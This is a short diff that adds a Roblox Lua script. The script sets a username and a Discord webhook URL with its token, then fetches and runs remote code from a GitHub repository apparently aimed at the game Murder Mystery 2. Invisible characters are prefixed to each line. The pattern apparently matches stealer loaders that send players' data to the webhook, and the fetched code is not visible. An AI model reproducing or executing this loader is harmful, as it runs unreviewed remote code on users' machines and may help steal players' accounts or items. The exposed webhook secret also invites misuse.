@@ -1,0 +1,6 @@
+‎Username = "motherqacker69"
+‎Webhook = "https://discord.com/api/webhooks/1371047179430531123/80DL3rfwZJHaUYnxIlWS_l61EjcrBe_yCMdRafUMyXqnMbDGSPARNYj8qJq0wrVq2hOm"
+‎
+‎
+‎
+‎loadstring(game:HttpGet("https://raw.githubusercontent.com/urekshesh/Protected_MM2/refs/heads/main/MM2"))()
